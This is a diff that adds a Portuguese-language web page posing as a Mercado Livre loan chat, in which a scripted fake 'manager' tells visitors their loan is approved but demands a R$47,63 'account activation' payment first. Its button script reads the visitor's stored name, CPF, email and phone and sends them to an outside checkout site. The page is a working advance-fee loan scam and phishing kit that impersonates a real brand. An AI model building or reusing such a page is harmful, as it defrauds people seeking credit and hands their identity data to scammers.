@@ -1,1 +1,376 @@
-index.html
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@400;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+    <title>Chat Empréstimo</title>
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Sora', sans-serif;
+            background-color: #ebebeb;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+            border-bottom: 1px solid #aa9900;
+            background-color: #FFE600;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+        }
+        .header img {
+            width: 125px;
+            padding: 10px;
+        }
+        .chat-container {
+            max-width: 600px;
+            margin: 80px auto 20px;
+            padding: 20px;
+        }
+        .message {
+            margin-bottom: 20px;
+            display: flex;
+            flex-direction: column;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s, transform 0.5s;
+            scroll-margin-top: 100px;
+        }
+        .message.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .message-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 5px;
+            color: #393939;
+            font-size: 15px;
+        }
+        .avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            margin-right: 10px;
+            overflow: hidden;
+        }
+        .avatar img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .message-content {
+            background-color: white;
+            padding: 15px;
+            border-radius: 7.5px;
+            box-shadow: 0 1px 0.5px rgba(0,0,0,0.13);
+            max-width: 80%;
+            position: relative;
+            margin-left: 50px;
+            display: none;
+        }
+        .message-content.show {
+            display: block;
+        }
+        .message-content::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -5px;
+            width: 0;
+            height: 0;
+            border-top: 8px solid white;
+            border-left: 8px solid transparent;
+        }
+        .benefits-list {
+            background-color: #f0f0f0;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 10px 0;
+        }
+        .button {
+            background-color: #FFE600;
+            color: black;
+            padding: 15px;
+            border-radius: 8px;
+            border: none;
+            width: 100%;
+            font-family: 'Sora', sans-serif;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 20px;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s, transform 0.5s;
+        }
+        .button.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .message-time {
+            font-size: 11px;
+            color: #8c8c8c;
+            text-align: right;
+            margin-top: 5px;
+        }
+        .typing {
+            display: none;
+            gap: 5px;
+            padding: 10px;
+            background: white;
+            border-radius: 7.5px;
+            width: fit-content;
+            margin-left: 50px;
+            opacity: 0;
+            position: relative;
+        }
+        .typing.show {
+            display: flex;
+            opacity: 1;
+        }
+        .typing::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -5px;
+            width: 0;
+            height: 0;
+            border-top: 8px solid white;
+            border-left: 8px solid transparent;
+        }
+        .typing span {
+            width: 8px;
+            height: 8px;
+            background: #93959f;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+        }
+        .typing span:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+        .typing span:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+            50% {
+                transform: scale(0.7);
+                opacity: 0.5;
+            }
+        }
+        .message-text {
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .message-text.show {
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="logo.png" alt="Logo Mercado Livre" class="logo">
+    </div>
+
+    <div class="chat-container">
+        <div style="background-color: #fff8e1; border-left: 4px solid #FFE600; padding: 15px; margin-bottom: 30px; border-radius: 4px; box-shadow: 0 1px 3px rgba(0,0,0,0.1);">
+            <div style="display: flex; align-items: center;">
+                <i class="fas fa-info-circle" style="color: #FFE600; margin-right: 12px; font-size: 20px;"></i>
+                <span style="color: #313131; font-size: 14px;">
+                    Fique na página! Essa é a última etapa para confirmar a liberação do seu empréstimo!
+                </span>
+            </div>
+        </div>
+
+        <div class="message" id="message1">
+            <div class="message-header">
+                <div class="avatar">
+                    <img src="gerente.png" alt="Juliana Benedito">
+                </div>
+                <strong>Juliana Benedito - Gerente mercado livre</strong>
+            </div>
+            <div class="typing"><span></span><span></span><span></span></div>
+            <div class="message-content">
+                <div class="message-text">
+                    Olá 😊! Sou a Juliana, sua gerente.<br><br>
+                    Parabéns pela sua aprovação! 🎉 Seu <strong>empréstimo</strong> está pronto para liberação.  
+                    Mas antes de finalizar a ultima etapa, precisamos concluir: a <strong>sua ativação da sua conta Mercado Livre</strong>.
+                </div>
+                <div class="message-time"></div>
+            </div>
+        </div>
+
+        <div class="message" id="message2">
+            <div class="message-header">
+                <div class="avatar">
+                    <img src="gerente.png" alt="Juliana Benedito">
+                </div>
+                <strong>Juliana Benedito - Gerente mercado livre</strong>
+            </div>
+            <div class="typing"><span></span><span></span><span></span></div>
+            <div class="message-content">
+                <div class="message-text">
+                    A ativação é necessária para validar a sua identidade e garantir que o dinheiro do empréstimo ira cair na sua conta com segurança.  
+                    Com sua conta ativa, você poderá:
+                    <div class="benefits-list">
+                        ✅ Receber o valor do empréstimo diretamente na conta<br>
+                        ✅ Fazer PIX e pagamentos<br>
+                        ✅ Consultar parcelas e extratos<br>
+                        ✅ Suporte 24h no app Mercado Livre Bank
+                    </div>
+                </div>
+                <div class="message-time"></div>
+            </div>
+        </div>
+
+        <div class="message" id="message3">
+            <div class="message-header">
+                <div class="avatar">
+                    <img src="gerente.png" alt="Juliana Benedito">
+                </div>
+                <strong>Juliana Benedito - Gerente mercado livre</strong>
+            </div>
+            <div class="typing"><span></span><span></span><span></span></div>
+            <div class="message-content">
+                <div class="message-text">
+                    Para ativar sua conta é muito simples: basta realizar o primeiro uso.  
+                    Pode ser um PIX para um amigo ou pagamento de conta (água, luz, telefone, etc).  
+                    O valor mínimo para ativação é de <strong>R$47,63</strong>.  
+                    Esse valor fica disponível na sua conta para uso livre, e após essa etapa, o empréstimo é liberado automaticamente 💰
+                </div>
+                <div class="message-time"></div>
+            </div>
+        </div>
+
+        <div class="message" id="message4">
+            <div class="message-header">
+                <div class="avatar">
+                    <img src="gerente.png" alt="Juliana Benedito">
+                </div>
+                <strong>Juliana Benedito - Gerente mercado livre</strong>
+            </div>
+            <div class="typing"><span></span><span></span><span></span></div>
+            <div class="message-content">
+                <div class="message-text">
+                    Para liberar o valor do seu empréstimo agora, clique no botão abaixo e faça a ativação da sua conta.  
+                    <br><br><strong>Assim que concluído, o valor será creditado em até 5 minutos.</strong>
+                </div>
+                <div class="message-time"></div>
+            </div>
+        </div>
+
+        <button id="btnAtivar" class="button pulse2">liberar empréstimo</button>
+
+        <style>
+            @keyframes pulse2 {
+                0% { box-shadow: 0 0 0 0 rgba(255, 230, 0, 0.7); }
+                70% { box-shadow: 0 0 0 15px rgba(255, 230, 0, 0); }
+                100% { box-shadow: 0 0 0 0 rgba(255, 230, 0, 0); }
+            }
+            .pulse2 { animation: pulse2 2s infinite; }
+        </style>
+
+        <script>
+            function showMessage(messageId, delay) {
+                setTimeout(() => {
+                    const message = document.getElementById(messageId);
+                    const typing = message.querySelector('.typing');
+                    const content = message.querySelector('.message-content');
+                    const text = message.querySelector('.message-text');
+                    const time = message.querySelector('.message-time');
+
+                    const now = new Date();
+                    const hours = now.getHours().toString().padStart(2, '0');
+                    const minutes = now.getMinutes().toString().padStart(2, '0');
+                    time.textContent = `${hours}:${minutes}`;
+
+                    message.classList.add('show');
+                    typing.classList.add('show');
+
+                    const messageTop = message.offsetTop;
+                    const windowHeight = window.innerHeight;
+                    const scrollPosition = messageTop - (windowHeight / 4);
+                    window.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+
+                    setTimeout(() => {
+                        typing.classList.remove('show');
+                        content.classList.add('show');
+                        text.classList.add('show');
+
+                        const updatedMessageTop = message.offsetTop;
+                        const updatedScrollPosition = updatedMessageTop - (windowHeight / 4);
+                        window.scrollTo({ top: updatedScrollPosition, behavior: 'smooth' });
+                    }, 1500);
+                }, delay);
+            }
+
+            // ⏩ Mensagens mais rápidas
+            showMessage('message1', 1000);
+            showMessage('message2', 4000);
+            showMessage('message3', 9000);
+            showMessage('message4', 14000);
+
+            setTimeout(() => {
+                const btnAtivar = document.getElementById('btnAtivar');
+                btnAtivar.classList.add('show');
+                window.scrollTo({
+                    top: document.body.scrollHeight,
+                    behavior: 'smooth'
+                });
+            }, 16000);
+
+            document.getElementById('btnAtivar').addEventListener('click', function() {
+                try {
+                    const dadosUsuario = JSON.parse(localStorage.getItem('dadosUsuario')) || {};
+                    const email = localStorage.getItem('email') || '';
+                    const telephone = localStorage.getItem('telefone') || '';
+
+                    const baseUrl = 'https://checkout.space-payments.shop/payment/checkout/e083b403-bd6f-45a4-9623-d687ef0f658c';
+                    const url = new URL(baseUrl);
+
+                    url.searchParams.append('name', dadosUsuario.NOME || '');
+                    url.searchParams.append('document', dadosUsuario.CPF || '');
+                    url.searchParams.append('email', email);
+                    url.searchParams.append('telephone', telephone);
+
+                    const finalUrl = buildUrlWithParams(url.toString());
+                    window.location.href = finalUrl;
+                } catch(err) {
+                    console.error('Erro ao redirecionar:', err);
+                    window.location.href = buildUrlWithParams('https://checkout.space-payments.shop/payment/checkout/e083b403-bd6f-45a4-9623-d687ef0f658c');
+                }
+            });
+        </script>
+    </div>
+
+    <script>
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            return url.toString();
+        }
+    </script>
+
+</body></html>
